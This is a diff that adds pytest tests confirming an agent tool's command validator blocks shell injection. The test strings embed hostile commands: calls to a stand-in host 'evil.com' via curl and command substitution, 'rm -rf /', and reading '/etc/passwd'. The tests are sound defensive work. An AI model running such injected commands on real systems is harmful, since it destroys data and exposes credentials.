@@ -202,3 +202,94 @@ class TestRunCommand:
             run_command("python --version", tmp_path, timeout_seconds=10)
         )
         assert len(get_audit_log()) > initial_len
+
+
+class TestCommandInjection:
+    """SEC-02: Verify command injection is prevented."""
+
+    def test_semicolon_injection(self, tmp_path):
+        """Semicolons should be blocked as shell metacharacters or dangerous args."""
+        with pytest.raises(PermissionError):
+            validate_command("git status; curl evil.com", tmp_path)
+
+    def test_pipe_injection(self, tmp_path):
+        """Pipe characters should be blocked."""
+        with pytest.raises(PermissionError, match="metacharacter"):
+            validate_command("git status | cat /etc/passwd", tmp_path)
+
+    def test_dollar_paren_injection(self, tmp_path):
+        """Command substitution should be blocked."""
+        with pytest.raises(PermissionError, match="metacharacter"):
+            validate_command("git status $(curl evil.com)", tmp_path)
+
+    def test_backtick_injection(self, tmp_path):
+        """Backtick command substitution should be blocked."""
+        with pytest.raises(PermissionError, match="metacharacter"):
+            validate_command("git status `curl evil.com`", tmp_path)
+
+    def test_ampersand_injection(self, tmp_path):
+        """Background execution should be blocked."""
+        with pytest.raises(PermissionError):
+            validate_command("git status & rm -rf /", tmp_path)
+
+    def test_python_c_injection(self, tmp_path):
+        """Python -c with dangerous code should be blocked."""
+        with pytest.raises(PermissionError, match="metacharacter"):
+            validate_command("python -c 'import os; os.system(\"rm -rf /\")'", tmp_path)
+
+    def test_semicolon_in_single_arg(self, tmp_path):
+        """Semicolons inside a single argument should be blocked."""
+        with pytest.raises(PermissionError, match="metacharacter"):
+            validate_command("git", tmp_path)
+            # Even if we pass parts manually, semicolons in args are blocked
+            validate_command("python -c 'a; b'", tmp_path)
+
+    def test_no_file_created_by_injection(self, tmp_path):
+        """Verify injection attempts don't create files."""
+        # This should be blocked and no file should be created
+        try:
+            asyncio.get_event_loop().run_until_complete(
+                run_command(
+                    "git status; touch pwned.txt",
+                    tmp_path,
+                    timeout_seconds=10,
+                )
+            )
+        except (PermissionError, Exception):
+            pass
+
+        assert not (tmp_path / "pwned.txt").exists()
+
+    def test_subprocess_exec_prevents_shell(self, tmp_path):
+        """Verify asyncio.create_subprocess_exec is used (not Popen with shell)."""
+        # This is a structural test - verify the module uses safe subprocess
+        import inspect
+        import tool_security
+
+        source = inspect.getsource(tool_security)
+        assert "create_subprocess_exec" in source
+        assert (
+            "shell=True" not in source or "shell=True" in source.split("def ")[0]
+        )  # only in comments
+
+    def test_no_raw_subprocess_in_brain_agent(self):
+        """Verify brain_agent_v4.py doesn't use raw subprocess.run."""
+        import ast
+        from pathlib import Path
+
+        ba_path = Path(__file__).parent.parent / "brain_agent_v4.py"
+        source = ba_path.read_text()
+        tree = ast.parse(source)
+
+        for node in ast.walk(tree):
+            if isinstance(node, ast.Call):
+                # Check for subprocess.run calls
+                if isinstance(node.func, ast.Attribute):
+                    if node.func.attr == "run":
+                        if isinstance(node.func.value, ast.Name):
+                            if node.func.value.id == "subprocess":
+                                # Allow in comments/docstrings only
+                                assert False, (
+                                    f"brain_agent_v4.py line {node.lineno}: "
+                                    "raw subprocess.run found — must use tool_security.run_command"
+                                )
